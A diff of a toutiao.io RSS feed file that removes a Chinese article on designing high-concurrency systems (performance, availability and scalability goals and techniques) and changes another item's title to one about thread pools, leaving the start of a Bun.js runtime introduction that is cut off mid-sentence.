@@ -5,30 +5,11 @@
             <link>http://toutiao.io/</link>
             <description></description>
 <item>
-<guid>514755e2398a37168b16f261d37b4423</guid>
-<title>高并发，你真的理解透彻了吗？</title>
-<link>https://toutiao.io/k/93k2zfb</link>
-<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;rich_media_content                           autoTypeSetting24psection&amp;#10;                          &quot; id=&quot;js_content&quot;&gt;
-            &lt;p data-tool=&quot;mdnice编辑器&quot;&gt;高并发，几乎是每个程序员都想拥有的经验。原因很简单：随着流量变大，会遇到各种各样的技术问题，比如接口响应超时、CPU load升高、GC频繁、死锁、大数据量存储等等，这些问题能推动我们在技术深度上不断精进。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在过往的面试中，如果候选人做过高并发的项目，我通常会让对方谈谈对于高并发的理解，但是能系统性地回答好此问题的人并不多，大概分成这样几类：&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;1、&lt;strong&gt;对数据化的指标没有概念&lt;/strong&gt;：不清楚选择什么样的指标来衡量高并发系统？分不清并发量和QPS，甚至不知道自己系统的总用户量、活跃用户量，平峰和高峰时的QPS和TPS等关键数据。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;2、&lt;strong&gt;设计了一些方案，但是细节掌握不透彻&lt;/strong&gt;：讲不出该方案要关注的技术点和可能带来的副作用。比如读性能有瓶颈会引入缓存，但是忽视了缓存命中率、热点key、数据一致性等问题。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;3、&lt;strong&gt;理解片面，把高并发设计等同于性能优化&lt;/strong&gt;：大谈并发编程、多级缓存、异步化、水平扩容，却忽视高可用设计、服务治理和运维保障。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;4、&lt;strong&gt;掌握大方案，却忽视最基本的东西&lt;/strong&gt;：能讲清楚垂直分层、水平分区、缓存等大思路，却没意识去分析数据结构是否合理，算法是否高效，没想过从最根本的IO和计算两个维度去做细节优化。&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-galleryid=&quot;&quot; data-ratio=&quot;0.4659090909090909&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ELQw2WCMgt1db27zfRllYrkrYdTMf5ODQSbhFQMPbzShfJxWsGdUwoIeyRsL8V0Da4d7ibZicGD2ugKic7E9sicl0Q/640?wx_fmt=png&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&amp;amp;wx_co=1&quot; data-type=&quot;png&quot; data-w=&quot;616&quot;/&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这篇文章，我想结合自己的高并发项目经验，系统性地总结下高并发需要掌握的知识和实践思路，希望对你有所帮助。内容分成以下3个部分：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;如何理解高并发？&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;高并发系统设计的目标是什么？&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;高并发的实践方案有哪些？&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;如何理解高并发？&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;高并发意味着大流量，需要运用技术手段抵抗流量的冲击，这些手段好比操作流量，能让流量更平稳地被系统所处理，带给用户更好的体验。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们常见的高并发场景有：淘宝的双11、春运时的抢票、微博大V的热点新闻等。除了这些典型事情，每秒几十万请求的秒杀系统、每天千万级的订单系统、每天亿级日活的信息流系统等，都可以归为高并发。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;很显然，上面谈到的高并发场景，并发量各不相同，&lt;strong&gt;那到底多大并发才算高并发呢&lt;/strong&gt;？&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;1、不能只看数字，要看具体的业务场景。不能说10W QPS的秒杀是高并发，而1W QPS的信息流就不是高并发。信息流场景涉及复杂的推荐模型和各种人工策略，它的业务逻辑可能比秒杀场景复杂10倍不止。因此，不在同一个维度，没有任何比较意义。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;2、业务都是从0到1做起来的，并发量和QPS只是参考指标，最重要的是：在业务量逐渐变成原来的10倍、100倍的过程中，你是否用到了高并发的处理方法去演进你的系统，从架构设计、编码实现、甚至产品方案等维度去预防和解决高并发引起的问题？而不是一味的升级硬件、加机器做水平扩展。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;此外，各个高并发场景的业务特点完全不同：有读多写少的信息流场景、有读多写多的交易场景，&lt;strong&gt;那是否有通用的技术方案解决不同场景的高并发问题呢？&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我觉得大的思路可以借鉴，别人的方案也可以参考，但是真正落地过程中，细节上还会有无数的坑。另外，由于软硬件环境、技术栈、以及产品逻辑都没法做到完全一致，这些都会导致同样的业务场景，就算用相同的技术方案也会面临不同的问题，这些坑还得一个个趟。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;因此，这篇文章我会将重点放在基础知识、通用思路、和我曾经实践过的有效经验上，希望让你对高并发有更深的理解。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;高并发系统设计的目标是什么？&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;先搞清楚高并发系统设计的目标，在此基础上再讨论设计方案和实践经验才有意义和针对性。&lt;/p&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;宏观目标&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;高并发绝不意味着只追求高性能，这是很多人片面的理解。从宏观角度看，高并发系统设计的目标有三个：高性能、高可用，以及高可扩展。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;1、高性能：性能体现了系统的并行处理能力，在有限的硬件投入下，提高性能意味着节省成本。同时，性能也反映了用户体验，响应时间分别是100毫秒和1秒，给用户的感受是完全不同的。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;2、高可用：表示系统可以正常服务的时间。一个全年不停机、无故障；另一个隔三差五出线上事故、宕机，用户肯定选择前者。另外，如果系统只能做到90%可用，也会大大拖累业务。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;3、高扩展：表示系统的扩展能力，流量高峰时能否在短时间内完成扩容，更平稳地承接峰值流量，比如双11活动、明星离婚等热点事件。&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.6342592592592593&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ELQw2WCMgt1db27zfRllYrkrYdTMf5ODibMTIy15HCkzH4FdnZhwPGiczoxwhLWN4YE37ibazKXMUTPQfB9LJBcLg/640?wx_fmt=png&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&amp;amp;wx_co=1&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这3个目标是需要通盘考虑的，因为它们互相关联、甚至也会相互影响。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;比如说：考虑系统的扩展能力，你会将服务设计成无状态的，这种集群设计保证了高扩展性，其实也间接提升了系统的性能和可用性。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;再比如说：为了保证可用性，通常会对服务接口进行超时设置，以防大量线程阻塞在慢请求上造成系统雪崩，那超时时间设置成多少合理呢？一般，我们会参考依赖服务的性能表现进行设置。&lt;/p&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;微观目标&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;再从微观角度来看，高性能、高可用和高扩展又有哪些具体的指标来衡量？为什么会选择这些指标呢？&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;性能指标&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;通过性能指标可以度量目前存在的性能问题，同时作为性能优化的评估依据。一般来说，会采用一段时间内的接口响应时间作为指标。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;1、平均响应时间：最常用，但是缺陷很明显，对于慢请求不敏感。比如1万次请求，其中9900次是1ms，100次是100ms，则平均响应时间为1.99ms，虽然平均耗时仅增加了0.99ms，但是1%请求的响应时间已经增加了100倍。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;2、TP90、TP99等分位值：将响应时间按照从小到大排序，TP90表示排在第90分位的响应时间， 分位值越大，对慢请求越敏感。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.27494199535962877&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ELQw2WCMgt1db27zfRllYrkrYdTMf5ODOoMt73YpeJDNepwjoCkpK7oK6htD3Wjardta5dQ7CDeZCvNYWGwmfQ/640?wx_fmt=png&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&amp;amp;wx_co=1&quot; data-type=&quot;png&quot; data-w=&quot;862&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;3、吞吐量：和响应时间呈反比，比如响应时间是1ms，则吞吐量为每秒1000次。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;通常，设定性能目标时会兼顾吞吐量和响应时间，比如这样表述：在每秒1万次请求下，AVG控制在50ms以下，TP99控制在100ms以下。对于高并发系统，AVG和TP分位值必须同时要考虑。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;另外，从用户体验角度来看，200毫秒被认为是第一个分界点，用户感觉不到延迟，1秒是第二个分界点，用户能感受到延迟，但是可以接受。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;因此，对于一个健康的高并发系统，TP99应该控制在200毫秒以内，TP999或者TP9999应该控制在1秒以内。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;可用性指标&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;高可用性是指系统具有较高的无故障运行能力，可用性 = 正常运行时间 / 系统总运行时间，一般使用几个9来描述系统的可用性。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.39800995024875624&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ELQw2WCMgt1db27zfRllYrkrYdTMf5ODu8L6WhzQ9yo4qnWtHIWpWZRokZNrU8RGCThoWX692SExv29ibb4Qj1A/640?wx_fmt=png&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&amp;amp;wx_co=1&quot; data-type=&quot;png&quot; data-w=&quot;402&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;对于高并发系统来说，最基本的要求是：保证3个9或者4个9。原因很简单，如果你只能做到2个9，意味着有1%的故障时间，像一些大公司每年动辄千亿以上的GMV或者收入，1%就是10亿级别的业务影响。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;可扩展性指标&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;面对突发流量，不可能临时改造架构，最快的方式就是增加机器来线性提高系统的处理能力。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;对于业务集群或者基础组件来说，扩展性 = 性能提升比例 / 机器增加比例，理想的扩展能力是：资源增加几倍，性能提升几倍。通常来说，扩展能力要维持在70%以上。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;但是从高并发系统的整体架构角度来看，扩展的目标不仅仅是把服务设计成无状态就行了，因为当流量增加10倍，业务服务可以快速扩容10倍，但是数据库可能就成为了新的瓶颈。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;像MySQL这种有状态的存储服务通常是扩展的技术难点，如果架构上没提前做好规划（垂直和水平拆分），就会涉及到大量数据的迁移。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;因此，高扩展性需要考虑：服务集群、数据库、缓存和消息队列等中间件、负载均衡、带宽、依赖的第三方等，当并发达到某一个量级后，上述每个因素都可能成为扩展的瓶颈点。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;高并发的实践方案有哪些？&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;了解了高并发设计的3大目标后，再系统性总结下高并发的设计方案，会从以下两部分展开：先总结下通用的设计方法，然后再围绕高性能、高可用、高扩展分别给出具体的实践方案。&lt;/p&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;通用的设计方法&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;通用的设计方法主要是从「纵向」和「横向」两个维度出发，俗称高并发处理的两板斧：纵向扩展和横向扩展。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;纵向扩展（scale-up）&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;它的目标是提升单机的处理能力，方案又包括：&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;1、提升单机的硬件性能：通过增加内存、CPU核数、存储容量、或者将磁盘升级成SSD等堆硬件的方式来提升。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;2、提升单机的软件性能：使用缓存减少IO次数，使用并发或者异步的方式增加吞吐量。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;横向扩展（scale-out）&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;因为单机性能总会存在极限，所以最终还需要引入横向扩展，通过集群部署以进一步提高并发处理能力，又包括以下2个方向：&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;1、做好分层架构：这是横向扩展的前&lt;span&gt;提&lt;/span&gt;，因为高并发系统往往业务复杂，通过分层处理可以简化复杂问题，更容易做到横向扩展。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.8009259259259259&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ELQw2WCMgt1db27zfRllYrkrYdTMf5OD1EherBJmH2EX2PO2Xz44f9wibK5ggLRuurWOibbVAcSDeBV6xBK2icuCA/640?wx_fmt=png&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&amp;amp;wx_co=1&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;上面这种图是互联网最常见的分层架构，当然真实的高并发系统架构会在此基础上进一步完善。比如会做动静分离并引入CDN，反向代理层可以是LVS+Nginx，Web层可以是统一的API网关，业务服务层可进一步按垂直业务做微服务化，存储层可以是各种异构数据库。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;2、各层进行水平扩展：无状态水平扩容，有状态做分片路由。业务集群通常能设计成无状态的，而数据库和缓存往往是有状态的，因此需要设计分区键做好存储分片，当然也可以通过主从同步、读写分离的方案提升读性能。&lt;/p&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;具体的实践方案&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;下面再结合我的个人经验，针对高性能、高可用、高扩展3个方面，总结下可落地的实践方案。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;高性能的实践方案&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;1、集群部署，通过负载均衡减轻单机压力。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;2、多级缓存，包括静态数据使用CDN、本地缓存、分布式缓存等，以及对缓存场景中的热点key、缓存穿透、缓存并发、数据一致性等问题的处理。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;3、分库分表和索引优化，以及借助搜索引擎解决复杂查询问题。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;4、考虑NoSQL数据库的使用，比如HBase、Redis等，但是团队必须熟悉这些组件，且有较强的运维能力。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;5、异步化，将次要流程通过多线程、MQ、甚至延时任务进行异步处理。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;6、限流，需要先考虑业务是否允许限流（比如秒杀场景是允许的），包括前端限流、Nginx接入层的限流、服务端的限流。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;7、对流量进行削峰填谷，通过MQ承接流量。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;8、并发处理，通过多线程将串行逻辑并行化。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;9、预计算，比如抢红包场景，可以提前计算好红包金额缓存起来，发红包时直接使用即可。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;10、缓存预热，通过异步任务提前预热数据到本地缓存或者分布式缓存中。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;11、减少IO次数，比如数据库和缓存的批量读写、RPC的批量接口支持、或者通过冗余数据的方式干掉RPC调用。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;12、减少IO时的数据包大小，包括采用轻量级的通信协议、合适的数据结构、去掉接口中的多余字段、减少缓存key的大小、压缩缓存value等。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;13、程序逻辑优化，比如将大概率阻断执行流程的判断逻辑前置、For循环的计算逻辑优化，或者采用更高效的算法。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;14、各种池化技术的使用和池大小的设置，包括HTTP请求池、线程池（考虑CPU密集型还是IO密集型设置核心参数）、数据库和Redis连接池等。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;15、JVM优化，包括新生代和老年代的大小、GC算法的选择等，尽可能减少GC频率和耗时。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;16、锁选择，读多写少的场景用乐观锁，或者考虑通过分段锁的方式减少锁冲突。上述方案无外乎从计算和 IO 两个维度考虑所有可能的优化点，需要有配套的监控系统实时了解当前的性能表现，并支撑你进行性能瓶颈分析，然后再遵循二八原则，抓主要矛盾进行优化。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;高可用的实践方案&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;1、对等节点的故障转移，Nginx和服务治理框架均支持一个节点失败后访问另一个节点。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;2、非对等节点的故障转移，通过心跳检测并实施主备切换（比如redis的哨兵模式或者集群模式、MySQL的主从切换等）。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;3、接口层面的超时设置、重试策略和幂等设计。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;4、降级处理：保证核心服务，牺牲非核心服务，必要时进行熔断；或者核心链路出问题时，有备选链路。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;5、限流处理：对超过系统处理能力的请求直接拒绝或者返回错误码。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;6、MQ场景的消息可靠性保证，包括producer端的重试机制、broker侧的持久化、consumer端的ack机制等。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;7、灰度发布，能支持按机器维度进行小流量部署，观察系统日志和业务指标，等运行平稳后再推全量。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;8、监控报警：全方位的监控体系，包括最基础的CPU、内存、磁盘、网络的监控，以及Web服务器、JVM、数据库、各类中间件的监控和业务指标的监控。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;9、灾备演练：类似当前的“混沌工程”，对系统进行一些破坏性手段，观察局部故障是否会引起可用性问题。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;高可用的方案主要从冗余、取舍、系统运维3个方向考虑，同时需要有配套的值班机制和故障处理流程，当出现线上问题时，可及时跟进处理。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;高扩展的实践方案&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;1、合理的分层架构：比如上面谈到的互联网最常见的分层架构，另外还能进一步按照数据访问层、业务逻辑层对微服务做更细粒度的分层（但是需要评估性能，会存在网络多一跳的情况）。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;2、存储层的拆分：按照业务维度做垂直拆分、按照数据特征维度进一步做水平拆分（分库分表）。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;3、业务层的拆分：最常见的是按照业务维度拆（比如电商场景的商品服务、订单服务等），也可以按照核心接口和非核心接口拆，还可以按照请求源拆（比如To C和To B，APP和H5）。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;最后的话&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;高并发确实是一个复杂且系统性的问题，由于篇幅有限，诸如分布式Trace、全链路压测、柔性事务都是要考虑的技术点。另外，如果业务场景不同，高并发的落地方案也会存在差异，但是总体的设计思路和可借鉴的方案基本类似。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;高并发设计同样要秉承架构设计的3个原则：简单、合适和演进。“过早的优化是万恶之源”，不能脱离业务的实际情况，更不要过度设计，合适的方案就是最完美的。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;希望这篇文章能带给你关于高并发更全面的认识，如果你也有可借鉴的经验和深入的思考，欢迎评论区留言讨论。&lt;/p&gt;&lt;p&gt;&lt;span&gt;- EOF -&lt;/span&gt;&lt;/p&gt;&lt;section donone=&quot;shifuMouseDownCard(&#x27;shifu_c_030&#x27;)&quot; label=&quot;Copyright Reserved by PLAYHUDONG.&quot;&gt;&lt;section&gt;&lt;span&gt;推荐阅读&lt;/span&gt;  &lt;span&gt;点击标题可跳转&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MjM5NzMyMjAwMA==&amp;amp;mid=2651516135&amp;amp;idx=1&amp;amp;sn=f1f14e39a9c846a43ca19a3cf40f75b0&amp;amp;chksm=bd2580988a52098e2e5f17ad8a779bed77ec94236fb30964620e50b4d1ebeeac68b6da7cef9b&amp;amp;scene=21#wechat_redirect&quot; textvalue=&quot;高并发下如何防重？&quot; linktype=&quot;text&quot; imgurl=&quot;&quot; imgdata=&quot;null&quot; data-itemshowtype=&quot;11&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;高并发下如何防重？&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MjM5NzMyMjAwMA==&amp;amp;mid=2651513836&amp;amp;idx=1&amp;amp;sn=37a40a1e7f36845b36c3ce589efe8c77&amp;amp;chksm=bd258f938a5206853eb812b26c990147c5419e2f4897ed22594e5a285def044352e7acf133c4&amp;amp;scene=21#wechat_redirect&quot; textvalue=&quot;服务端高并发分布式架构演进之路&quot; linktype=&quot;text&quot; imgurl=&quot;&quot; imgdata=&quot;null&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;服务端高并发分布式架构演进之路&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MjM5NzMyMjAwMA==&amp;amp;mid=2651506492&amp;amp;idx=1&amp;amp;sn=b2ff75dbbe026e96e2b74eb499fd5223&amp;amp;chksm=bd25ab438a522255f8ef889431b9eb4ac67fbc51ecf9becd176b816b111d1729d6a0387596ff&amp;amp;scene=21#wechat_redirect&quot; textvalue=&quot;看完这篇还不懂高并发中的线程与线程池你来打我&quot; linktype=&quot;text&quot; imgurl=&quot;&quot; imgdata=&quot;null&quot; data-itemshowtype=&quot;11&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;看完这篇还不懂高并发中的线程与线程池你来打我&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;看完本文有收获？请转发分享给更多人&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;关注「ImportNew」，提升Java技能&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.9166666666666666&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/2A8tXicCG8ylbWIGfdoDED35IRRySQZTXUkJ1eop9MHApzFibKnOo0diboXpl0rmS5mH78YJhsWQv0dhv718A6kUA/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;600&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;span/&gt;&lt;span&gt;点赞和在看就是最大的支持&lt;/span&gt;&lt;span&gt;❤️&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;/p&gt;
-          &lt;/div&gt;
-
-          
-
-          
-
-
-
-           
-                                
-                    
-        &lt;/div&gt;&lt;/div&gt;</content:encoded>
-</item>
-<item>
-<guid>a7ff4f8176fb82b948d5167cae4c3227</guid>
-<title>他来了！性能吊打 Node.js 和 Deno 的新一代 javaScript 运行时！</title>
-<link>https://toutiao.io/k/jbcbma9</link>
+<guid>8d9715f1699224592a22fc6636e38da9</guid>
+<title>阿里规约手动创建线程池，我为什么还继续使用Executors呢？</title>
+<link>https://toutiao.io/k/owwky6z</link>
 <content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;rich_media_content                                       &quot; id=&quot;js_content&quot;&gt;
-            &lt;section data-tool=&quot;mdnice编辑器&quot; data-website=&quot;https://www.mdnice.com&quot; data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;今天跟大家介绍一个最新开源的 &lt;code&gt;javaScript&lt;/code&gt; 运行时：&lt;code&gt;Bun.js&lt;/code&gt;。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5091258405379443&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/e5Dzv8p9XdTlPCwFbaXDPLvJ4ls5TiavPXJnW6hBzdQFLultkLnksnMeSZj8oAMLtfZXJs6XyVDcib4zzKmT7HQw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2082&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;刚开源不到一个月就获得了 &lt;code&gt;19.5k&lt;/code&gt; star！看起来马上就会成为 &lt;code&gt;Node.js&lt;/code&gt; 和 &lt;code&gt;Deno&lt;/code&gt; 的一大竞争对手了！&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;和传统的 &lt;code&gt;Node.js&lt;/code&gt; 这种传统的 &lt;code&gt;javaScript&lt;/code&gt; 运行时不同，&lt;code&gt;Bun.js&lt;/code&gt; 直接内置了打包器、转译器、任务运行器和 &lt;code&gt;npm&lt;/code&gt; 客户端，这意味着你不再需要 &lt;code&gt;Webpack/Rollup/esbuild/Snowpack/Parcel/Rome/swc/babel&lt;/code&gt; 就可以直接运行 &lt;code&gt;TypeScript、JSX&lt;/code&gt;！&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;另外，&lt;code&gt;Bun.js&lt;/code&gt; 原生支持了数百个 &lt;code&gt;Node.js&lt;/code&gt; 和 &lt;code&gt;Web API&lt;/code&gt;，包括约 &lt;code&gt;90%&lt;/code&gt; 的 &lt;code&gt;Node-API&lt;/code&gt; 